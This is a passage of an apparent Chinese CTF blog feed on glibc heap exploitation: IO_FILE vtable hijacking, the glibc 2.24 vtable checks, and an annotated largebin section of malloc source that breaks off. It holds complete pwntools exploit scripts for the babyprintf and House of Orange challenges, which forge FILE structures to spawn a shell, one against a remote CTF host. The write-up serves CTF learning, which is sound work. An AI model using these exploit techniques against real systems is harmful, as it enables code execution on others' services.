class="number">0x4</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xd8</span>, <span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&quot;_IO_2_1_stderr_&quot;</span>] + <span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">0xe0</span>, <span class="string">&quot;lemon\x00\x00\x00&quot;</span> + p64(libc.sym[<span class="string">&quot;_IO_2_1_stderr_&quot;</span>]))</span><br><span class="line">edit(<span class="string">&quot;lemon&quot;</span>, payload)</span><br><span class="line">ru(menu)</span><br><span class="line">sl(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sl(<span class="string">&#x27;exec 1&gt;&amp;0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>人为需要计算一下，可以使用pwn_debug，使得exp构造更简单一些</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">backdoor()</span><br><span class="line">ru(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(re(<span class="number">12</span>, <span class="number">0</span>), base=<span class="number">16</span>) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc.address = leak</span><br><span class="line">echo(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">fake_file = IO_FILE_plus()</span><br><span class="line">fake_file._flags = <span class="number">0x0068732f6e69622f</span></span><br><span class="line">fake_file._IO_write_ptr = <span class="number">1</span> </span><br><span class="line">fake_file._IO_write_base = <span class="number">0</span></span><br><span class="line">fake_file._IO_save_end = libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">fake_file.vtable = libc.sym[<span class="string">&quot;_IO_2_1_stderr_&quot;</span>] + <span class="number">0x40</span></span><br><span class="line">fake_file.show()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xe0</span>, <span class="string">&quot;lemon\x00\x00\x00&quot;</span> + p64(libc.sym[<span class="string">&quot;_IO_2_1_stderr_&quot;</span>]))</span><br><span class="line">edit(<span class="string">&quot;lemon&quot;</span>, <span class="built_in">str</span>(fake_file))</span><br><span class="line">ru(menu)</span><br><span class="line">sl(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sl(<span class="string">&#x27;exec 1&gt;&amp;0&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="glibc2-24新增保护"><a href="#glibc2-24新增保护" class="headerlink" title="glibc2.24新增保护"></a>glibc2.24新增保护</h2><h5 id="IO-str-jump地址确定"><a href="#IO-str-jump地址确定" class="headerlink" title="_IO_str_jump地址确定"></a>_IO_str_jump地址确定</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p _IO_str_underflow</span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">    &lt;text variable, no debug info&gt;&#125; <span class="number">0x7f4d4cf04790</span> &lt;_IO_str_underflow&gt;</span><br><span class="line">pwndbg&gt; search -p <span class="number">0x7f4d4cf04790</span></span><br><span class="line">libc.so<span class="number">.6</span>       <span class="number">0x7f4d4d2240a0</span> <span class="number">0x7f4d4cf04790</span></span><br><span class="line">libc.so<span class="number">.6</span>       <span class="number">0x7f4d4d224160</span> <span class="number">0x7f4d4cf04790</span></span><br><span class="line">libc.so<span class="number">.6</span>       <span class="number">0x7f4d4d2245e0</span> <span class="number">0x7f4d4cf04790</span></span><br><span class="line">pwndbg&gt; p &amp;_IO_file_jumps</span><br><span class="line">$<span class="number">2</span> = (&lt;data variable, no debug info&gt; *) <span class="number">0x7f4d4d224440</span> &lt;_IO_file_jumps&gt;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">IO_file_jumps_offset = libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">IO_str_underflow_offset = libc.sym[<span class="string">&#x27;_IO_str_underflow&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> ref_offset <span class="keyword">in</span> libc.search(p64(IO_str_underflow_offset)):</span><br><span class="line">    possible_IO_str_jumps_offset = ref_offset - <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:</span><br><span class="line">        <span class="built_in">print</span> possible_IO_str_jumps_offset</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>在 2.24 版本的 glibc 中，全新加入了针对 _IO_FILE_plus 的 vtable 劫持的检测措施，glibc 会在调用虚函数之前首先检查 vtable 地址的合法性。首先会验证 vtable 是否位于_IO_vtable 段中，如果满足条件就正常执行，否则会调用_IO_vtable_check 做进一步检查。</p><p><code>__start___libc_IO_vtables</code>指向第一个vtable地址<code>_IO_helper_jumps</code>，而<code>__stop___libc_IO_vtables</code>指向最后一个vtable<code>_IO_str_chk_jumps</code>结束的地址，所以要保证利用的手法在这个vtable段中。</p><p>直接写出利用手法如下：</p><blockquote><p>fp-&gt;_mode = 0</p><p>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</p><p>fp-&gt;_IO_read_ptr = 0x61（smallbin size）</p><p>fp-&gt;_IO_read_base = _IO_list_all - 0x10</p><p>上面是做HOO的时候可以用到的tips</p><p>vtable = _IO_str_jumps - 8（使得_IO_str_finish函数成为了伪造的vtable的_IO_OVERFLOW，<code>_IO_str_finish</code>偏移为<code>_IO_str_jumps</code>中0x10，而<code>_IO_OVERFLOW</code>为0x18）</p><p>fp-&gt;_flags的最低位为0</p><p>fp-&gt;_IO_buf_base = binsh_addr（作为参数）</p><p>fp-&gt;_s._free_buffer = system 或者 og（fp + 0xe8）</p></blockquote><p>通过以上构造可以使得调用<code>(fp-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base)</code>，<code>fp-&gt;_IO_buf_base</code>为第一个参数</p><h3 id="babyprintf"><a href="#babyprintf" class="headerlink" title="babyprintf"></a>babyprintf</h3><p>无限堆溢出，按照如上的构造方法来构造即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn_debug.pwn_debug <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn_debug.IO_FILE_plus <span class="keyword">import</span> *</span><br><span class="line">pdbg=pwn_debug(<span class="string">&quot;babyprintf&quot;</span>)</span><br><span class="line"></span><br><span class="line">pdbg.context.terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pdbg.local()</span><br><span class="line">pdbg.debug(<span class="string">&quot;2.24&quot;</span>)</span><br><span class="line">pdbg.remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">22</span>)</span><br><span class="line"><span class="comment">#p=pdbg.run(&quot;local&quot;)</span></span><br><span class="line"><span class="comment">#p=pdbg.run(&quot;remote&quot;)</span></span><br><span class="line">p=pdbg.run(<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">membp=pdbg.membp</span><br><span class="line"><span class="comment">#print type(pdbg.membp)</span></span><br><span class="line"><span class="comment">#print hex(membp.elf_base),hex(membp.libc_base)</span></span><br><span class="line">elf=pdbg.elf</span><br><span class="line">libc=pdbg.libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_one</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;string: &quot;</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;result: &quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#pdbg.bp([0x4007f0])</span></span><br><span class="line">    <span class="comment"># step 1 leaking libc address and overwrite top chunk size</span></span><br><span class="line">    data=<span class="string">&quot;%p%p%p%p%p**%p**&quot;</span></span><br><span class="line">    data=data.ljust(<span class="number">0x2f8</span>,<span class="string">&#x27;*&#x27;</span>)+p64(<span class="number">0xd01</span>)</span><br><span class="line">    write_one(<span class="number">0x2f0</span>,data)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;**&quot;</span>)</span><br><span class="line">    libc_base=<span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;**&quot;</span>)[:-<span class="number">2</span>],<span class="number">16</span>)-libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">240</span></span><br><span class="line">    io_list_all=libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    io_str_jumps=libc_base+libc.symbols[<span class="string">&#x27;_IO_str_jumps&#x27;</span>]</span><br><span class="line">    binsh_addr=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line">    system_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&quot;leaking libc base: %s&quot;</span>%<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="comment">#pdbg.bp()</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># step 2 trigger sysmalloc</span></span><br><span class="line">    write_one(<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    fake_file=IO_FILE_plus()</span><br><span class="line">    fake_file._IO_read_ptr=<span class="number">0x61</span></span><br><span class="line">    fake_file._IO_read_base=io_list_all-<span class="number">0x10</span></span><br><span class="line">    fake_file._IO_buf_base=binsh_addr</span><br><span class="line">    fake_file._IO_write_ptr=<span class="number">1</span></span><br><span class="line">    fake_file.vtable=io_str_jumps-<span class="number">8</span></span><br><span class="line"></span><br><span class="line">    fake_file.show()</span><br><span class="line">    fake_file.str_finish_check()</span><br><span class="line">    file_data=<span class="built_in">str</span>(fake_file)+p64(system_addr)*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#fake_chunk=p64(0)+p64(0x61)+p64(io_list_all-0x10)*2</span></span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2f0</span></span><br><span class="line">    payload+=file_data</span><br><span class="line">    <span class="comment">## step 3 overwrite unsorted-&gt;bk</span></span><br><span class="line">    write_one(<span class="number">0x2f0</span>,payload)</span><br><span class="line">    <span class="comment">#pdbg.bp(0x4007d2)</span></span><br><span class="line">    <span class="comment">## step 4 malloc again, trigger unsorted attack and _IO_flush_all_lokcp</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.interactive() <span class="comment">#get the shell</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   pwn()</span><br></pre></td></tr></table></figure><h3 id="houseoforange-hitcon-2016"><a href="#houseoforange-hitcon-2016" class="headerlink" title="houseoforange_hitcon_2016"></a>houseoforange_hitcon_2016</h3><p>任意堆溢出漏洞，edit可编辑size大小</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn_debug <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&quot;./pwn&quot;)</span></span><br><span class="line">sh = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29427</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/glibc/x64/2.23/lib/libc-2.23.so&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;../libc-2.23.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">cho = <span class="string">&#x27;Your choice : &#x27;</span>      </span><br><span class="line">siz = <span class="string">&#x27;Length of name :&#x27;</span>    </span><br><span class="line">con = <span class="string">&#x27;Name :&#x27;</span>        </span><br><span class="line">pri = <span class="string">&#x27;Price of Orange:&#x27;</span></span><br><span class="line">col = <span class="string">&#x27;Color of Orange:&#x27;</span></span><br><span class="line">ind = <span class="string">&#x27;&#x27;</span>     </span><br><span class="line">edi = <span class="string">&#x27;&#x27;</span>        </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content, price, color, c=<span class="string">&#x27;1&#x27;</span></span>):</span></span><br><span class="line">    sh.sendlineafter(cho, c)</span><br><span class="line">    sh.sendlineafter(siz, <span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendafter(con, content)</span><br><span class="line">    sh.sendlineafter(pri, <span class="built_in">str</span>(price))</span><br><span class="line">    sh.sendlineafter(col, <span class="built_in">str</span>(color))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">c=<span class="string">&#x27;2&#x27;</span></span>):</span></span><br><span class="line">    sh.sendlineafter(cho, c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">length, content, price, color, c=<span class="string">&#x27;3&#x27;</span></span>):</span></span><br><span class="line">    sh.sendlineafter(cho, c)</span><br><span class="line">    sh.sendlineafter(siz, <span class="built_in">str</span>(length))</span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Name:&#x27;</span>, content)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Price of Orange: &#x27;</span>, <span class="built_in">str</span>(price))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;Color of Orange: &quot;</span>, <span class="built_in">str</span>(color))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span>, <span class="number">0x10</span>, <span class="number">0xddaa</span>)  </span><br><span class="line">payload = <span class="string">&#x27;p&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0x21</span>)+p32(<span class="number">0x10</span>)+p32(<span class="number">0xddaa</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xf31</span>)</span><br><span class="line">edit(<span class="number">0xb1</span>, payload, <span class="number">0x10</span>, <span class="number">0xddaa</span>)        <span class="comment"># 劫持top chunk的size为0xf31</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>, <span class="number">0x1111</span>, <span class="number">0xddaa</span>)    <span class="comment"># top chunk掉入unsortbin</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>, <span class="number">0x1111</span>, <span class="number">0xddaa</span>)</span><br><span class="line">show()</span><br><span class="line">heap_ptr = u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = heap_ptr-<span class="number">1640</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span></span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">io_list_all = libc_base + libc.sym[<span class="string">&quot;_IO_list_all&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line">IO_file_jumps_offset = libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">IO_str_underflow_offset = libc.sym[<span class="string">&#x27;_IO_str_underflow&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ref_offset <span class="keyword">in</span> libc.search(p64(IO_str_underflow_offset)):</span><br><span class="line">    possible_IO_str_jumps_offset = ref_offset - <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:</span><br><span class="line">        success(<span class="built_in">hex</span>(possible_IO_str_jumps_offset))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">io_str_jumps = libc_base+possible_IO_str_jumps_offset   <span class="comment"># 0x3c34a0</span></span><br><span class="line">success(<span class="built_in">hex</span>(io_str_jumps))</span><br><span class="line"></span><br><span class="line">fake_file = p64(<span class="number">0</span>) + p64(<span class="number">0x60</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(io_list_all - <span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)<span class="comment"># _IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(binsh_addr)<span class="comment"># _IO_buf_base = binsh_addr</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xC0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">fake_file += p64(io_str_jumps - <span class="number">0x8</span>)<span class="comment"># vtable</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)</span><br><span class="line">fake_file += p64(system)</span><br><span class="line"></span><br><span class="line">file_data = <span class="built_in">str</span>(fake_file) + p64(system) * <span class="number">2</span></span><br><span class="line">payload = <span class="string">&#x27;x&#x27;</span> * (<span class="number">0x540</span> - <span class="number">0x140</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + \</span><br><span class="line">    p32(<span class="number">0x666</span>) + p32(<span class="number">0xddaa</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += file_data</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x800</span>, payload, <span class="number">666</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> IO_FILE利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>largebin attack 学习(例子未完成)</title>
      <link href="2021/07/25/largebin-attack/"/>
      <url>2021/07/25/largebin-attack/</url>
      
        <content type="html"><![CDATA[<h2 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h2><blockquote><p>在64位下，申请大于0x400chunk最终会进入largebin。<br>Large bins 一共包括63 个bin，每个bin 中的chunk 大小不是一个固定公差的等差数列，而是分成6 组bin，每组bin 是一个固定公差的等差数列，每组的bin 数量依次为32、16、8、4、2、1，公差依次为64B、512B、4096B、32768B、262144B 等。</p></blockquote><p>根据ctfwiki和师傅们的总结：</p><ul><li>按照大小从大到小排序</li><li>若大小相同,按照free时间排序</li><li>若干个大小相同的堆块,只有首堆块的fd_nextsize和bk_nextsize会指向其他堆块,后面的堆块的fd_nextsize和bk_nextsize均为0</li><li>size最大的chunk的bk_nextsize指向最小的chunk; size最小的chunk的fd_nextsize指向最大的chunk</li></ul><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>进入largebin的相关代码如下(_int_malloc)<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 先判断下是不是unsorted本身，不是就进入while</span></span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">// victim = 将要入largebin的块</span></span><br><span class="line">          bck = victim-&gt;bk; </span><br><span class="line">        <span class="comment">// 检测size</span></span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">        <span class="comment">// 这个地方的bck是之前unsortedbin中的第二块，将bin[1]的bk赋值为第二块，开始进行脱链操作</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">        <span class="comment">// 将第二块的fd赋值为bin[1](ub)</span></span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">            <span class="comment">// 获得对应largebin的index</span></span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">            <span class="comment">// bck为bin[对应的index]，记为bin1</span></span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">            <span class="comment">// fwd = bin1 -&gt; fd ，即整个链条的尾部</span></span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">            <span class="comment">// largebin里有就进if</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                <span class="comment">// 如果该chunk的size小于bin1 -&gt; bk -&gt; size， 即小于最前面的那个，就进if</span></span><br><span class="line">                  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                    &#123;</span><br><span class="line">                    <span class="comment">// fwd = bin1</span></span><br><span class="line">                      fwd = bck;</span><br><span class="line">                    <span class="comment">// bck = bin1 -&gt; bk (第一个chunk)</span></span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"><span class="comment">// 调整nextsize: fd_nextsize = bin1 -&gt; fd，即指向最后一个chunk</span></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">              <span class="comment">// 调整nextsize: bk_nextsize = bin1 -&gt; fd -&gt; bk_nextsize，即指向第一个chunk（该chunk插入后将会成为第一个chunk）</span></span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                    <span class="comment">// 调整相邻两块的nextsize，第一块chunk的fd_nextsize将成为victim，最后一块的bk_nextsize将会成为victim（此时nextsize已完成链表的插入操作）</span></span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="comment">// 该chunk大于前面那个chunk的size就进else</span></span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                    <span class="comment">// 直到该size大于等于链表中的某个size（从尾部开始遍历，即size最大的地方向小的地方遍历）</span></span><br><span class="line">                      <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"><span class="comment">// 判断是否和size相等，相等的话就链到前面</span></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                    <span class="comment">// 不相等</span></span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                        <span class="comment">// 调整nextsize，这个时候是以fwd为索引，因为进入了while循环，不确定fwd是否发生了改变，bck索引不再准确</span></span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                        <span class="comment">// 调整相邻chunk的nextsize</span></span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                <span class="comment">// 对应的情况就是largebin中只有这一个，也就是该chunk是第一个进入largebin的块，那么其两个nextsize位都是其本身</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 最后都进行链表的插入</span></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><h3 id="图示"><a href="#图示" class="headerlink" title="图示"></a>图示</h3><p>网络上有一张比较经典的largebin的图示，我再稍微补充一下index64的fd和bk，大概长这样</p><p><img 